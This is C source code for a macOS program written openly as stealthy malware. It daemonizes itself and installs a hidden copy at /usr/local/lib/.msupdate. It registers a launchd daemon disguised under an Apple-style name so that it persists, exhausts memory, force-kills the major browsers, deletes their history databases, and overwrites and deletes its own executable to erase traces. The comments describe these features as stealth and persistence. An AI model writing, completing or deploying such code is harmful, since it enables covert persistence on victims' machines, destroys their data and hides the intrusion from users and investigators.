#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pwd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dlfcn.h>

#define CHUNK_SIZE (100 * 1024 * 1024)  // 100MB chunks
#define DELAY_SEC (2 * 60)              // 2 minutes in seconds

// Logging for debugging (stealthy)
void LogActivity(const char *msg) {
    char logPath[PATH_MAX];
    const char *tmpDir = getenv("TMPDIR");
    if (!tmpDir) tmpDir = "/tmp";
    snprintf(logPath, PATH_MAX, "%s/.mslog.dat", tmpDir);
    FILE *logFile = fopen(logPath, "a");
    if (logFile) {
        fprintf(logFile, "[%ld] %s\n", time(NULL), msg);
        fclose(logFile);
    }
}

// Terminate browser processes to release file locks
void KillBrowsers() {
    char *browsers[] = {"Google Chrome", "Firefox", "Safari", "Brave Browser", NULL};
    char command[512];
    
    for (int i = 0; browsers[i]; i++) {
        snprintf(command, sizeof(command), "pkill -9 \"%s\" 2>/dev/null", browsers[i]);
        system(command);
        LogActivity("Terminated browser processes");
    }
}

// Clear browser download history by deleting history files
void ClearBrowserDownloadHistory() {
    struct passwd *pw = getpwuid(getuid());
    const char *homedir = pw->pw_dir;
    char path[PATH_MAX];
    
    // Chrome-based browsers
    char *chromePaths[] = {
        "/Library/Application Support/Google/Chrome/Default/History",
        "/Library/Application Support/Google/Chrome/Default/History-journal",
        "/Library/Application Support/BraveSoftware/Brave-Browser/Default/History",
        "/Library/Application Support/BraveSoftware/Brave-Browser/Default/History-journal",
        NULL
    };
    
    // Firefox
    char firefoxPattern[PATH_MAX];
    snprintf(firefoxPattern, PATH_MAX, "%s/Library/Application Support/Firefox/Profiles", homedir);
    
    // Safari
    char *safariPaths[] = {
        "/Library/Safari/History.db",
        "/Library/Safari/History.db-lock",
        "/Library/Safari/History.db-wal",
        "/Library/Safari/History.db-shm",
        NULL
    };
    
    KillBrowsers(); // Ensure browsers are closed
    
    // Delete Chrome history files
    for (int i = 0; chromePaths[i]; i++) {
        snprintf(path, PATH_MAX, "%s%s", homedir, chromePaths[i]);
        if (remove(path) == 0) {
            LogActivity("Deleted Chrome history file");
        }
    }
    
    // Delete Safari history files
    for (int i = 0; safariPaths[i]; i++) {
        snprintf(path, PATH_MAX, "%s%s", homedir, safariPaths[i]);
        if (remove(path) == 0) {
            LogActivity("Deleted Safari history file");
        }
    }
    
    // Find and delete Firefox history
    DIR *dir = opendir(firefoxPattern);
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (strstr(entry->d_name, ".default") || strstr(entry->d_name, ".default-release")) {
                snprintf(path, PATH_MAX, "%s/%s/places.sqlite", firefoxPattern, entry->d_name);
                if (remove(path) == 0) {
                    LogActivity("Deleted Firefox history file");
                }
            }
        }
        closedir(dir);
    }
}

// Self-deletion with overwrite
void SelfDelete() {
    char exePath[PATH_MAX];
    uint32_t size = sizeof(exePath);
    
    if (_NSGetExecutablePath(exePath, &size) == 0) {
        // Overwrite with random data
        FILE *self = fopen(exePath, "r+");
        if (self) {
            char *buffer = malloc(CHUNK_SIZE);
            if (buffer) {
                memset(buffer, arc4random(), CHUNK_SIZE);
                fwrite(buffer, 1, CHUNK_SIZE, self);
                free(buffer);
            }
            fclose(self);
        }
        
        // Schedule deletion
        char command[PATH_MAX + 50];
        snprintf(command, sizeof(command), "rm -f \"%s\" &", exePath);
        system(command);
        LogActivity("Scheduled self-deletion with overwrite");
    }
}

// Daemonize process for stealth
void Daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    
    // Create new session
    if (setsid() < 0) exit(EXIT_FAILURE);
    
    // Fork again
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    
    // Change working directory
    chdir("/");
    
    // Close standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    LogActivity("Process daemonized");
}

// Copy to system location for persistence
void InstallToSystem() {
    char exePath[PATH_MAX];
    char destPath[PATH_MAX] = "/usr/local/lib/.msupdate";
    uint32_t size = sizeof(exePath);
    
    if (_NSGetExecutablePath(exePath, &size) == 0) {
        // Create destination directory
        system("mkdir -p /usr/local/lib/ 2>/dev/null");
        
        // Copy executable
        char command[PATH_MAX * 2 + 50];
        snprintf(command, sizeof(command), "cp \"%s\" \"%s\" 2>/dev/null", exePath, destPath);
        system(command);
        
        // Set hidden attribute and execute permissions
        system("chmod +x /usr/local/lib/.msupdate 2>/dev/null");
        
        // Add to launchd for persistence
        FILE *plist = fopen("/Library/LaunchDaemons/com.apple.msupdate.plist", "w");
        if (plist) {
            fprintf(plist, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
                    "<plist version=\"1.0\">\n"
                    "<dict>\n"
                    "    <key>Label</key>\n"
                    "    <string>com.apple.msupdate</string>\n"
                    "    <key>ProgramArguments</key>\n"
                    "    <array>\n"
                    "        <string>/usr/local/lib/.msupdate</string>\n"
                    "    </array>\n"
                    "    <key>RunAtLoad</key>\n"
                    "    <true/>\n"
                    "    <key>KeepAlive</key>\n"
                    "    <false/>\n"
                    "    <key>Hidden</key>\n"
                    "    <true/>\n"
                    "</dict>\n"
                    "</plist>");
            fclose(plist);
            system("launchctl load /Library/LaunchDaemons/com.apple.msupdate.plist 2>/dev/null");
        }
        
        LogActivity("Installed to system location");
    }
}

int main() {
    // Daemonize for stealth
    Daemonize();
    
    // Install to system for persistence
    InstallToSystem();
    
    // Delay execution
    sleep(DELAY_SEC);

    size_t total_allocated = 0;
    void **chunks = NULL;
    size_t chunk_count = 0;
    size_t attempts = 0;

    while (attempts < 10) {
        attempts++;
        void *chunk = malloc(CHUNK_SIZE);
        if (chunk) {
            memset(chunk, 69, CHUNK_SIZE);
            total_allocated += CHUNK_SIZE;
            void **temp = realloc(chunks, (chunk_count + 1) * sizeof(void*));
            if (temp) {
                chunks = temp;
                chunks[chunk_count] = chunk;
                chunk_count++;
            }
            if (chunk_count > 0) {
                size_t idx = arc4random_uniform((uint32_t)chunk_count);
                memset(chunks[idx], 42, CHUNK_SIZE);
            }
        }
    }

    // Clean up memory
    for (size_t i = 0; i < chunk_count; i++) {
        free(chunks[i]);
    }
    free(chunks);
    LogActivity("Freed memory");

    // Clear browser download history
    ClearBrowserDownloadHistory();

    // Delete the executable
    SelfDelete();

    return 0;
}
